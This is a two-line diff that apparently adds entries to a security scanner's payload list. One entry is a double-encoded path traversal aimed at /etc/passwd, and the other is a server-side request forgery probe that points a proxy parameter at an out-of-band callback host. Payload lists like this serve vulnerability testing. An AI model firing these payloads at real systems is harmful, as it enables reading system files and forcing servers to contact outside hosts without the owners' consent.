@@ -1,0 +1,2 @@
+/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/proxy.stream?origin=http://{{interactsh-url}}
